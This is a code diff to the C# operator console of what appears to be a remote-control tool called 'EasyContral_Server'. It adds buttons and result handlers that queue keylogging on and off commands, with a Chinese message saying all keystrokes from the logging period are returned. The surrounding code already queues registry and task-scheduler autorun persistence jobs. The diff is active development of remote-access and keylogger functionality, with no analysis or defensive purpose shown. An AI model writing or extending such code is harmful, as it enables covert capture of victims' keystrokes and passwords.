@@ -155,6 +155,12 @@ namespace EasyContral_Server
                             case "AutoRunRegistryResult":
                                 MessageBox.Show("已执行");
                                 break;
+                            case "KeyboardListenOnResult":
+                                MessageBox.Show("已开启键盘监听\n\n注意：\n当你关闭键盘监听时可以获取开启时间段内的所有记录");
+                                break;
+                            case "KeyBoardListenOffResult":
+                                MessageBox.Show(output);
+                                break;
                             default:
                                 MessageBox.Show("错误");
                                 break;
@@ -359,6 +365,22 @@ namespace EasyContral_Server
                 Jobe.Add("Data", "AutoRunTaskScheduler");
                 Form1.Jobes.Enqueue(Jobe);
             }
+        }
+
+        private void On_Click(object sender, EventArgs e)
+        {
+            Dictionary<string, string> Jobe = new Dictionary<string, string>();
+            Jobe.Add("Type", "KeyBoardListenOn");
+            Jobe.Add("Data", "KeyBoardListenOn");
+            Form1.Jobes.Enqueue(Jobe);
+        }
+
+        private void Off_Click(object sender, EventArgs e)
+        {
+            Dictionary<string, string> Jobe = new Dictionary<string, string>();
+            Jobe.Add("Type", "KeyBoardListenOff");
+            Jobe.Add("Data", "KeyBoardListenOff");
+            Form1.Jobes.Enqueue(Jobe);
         }
     }
 }
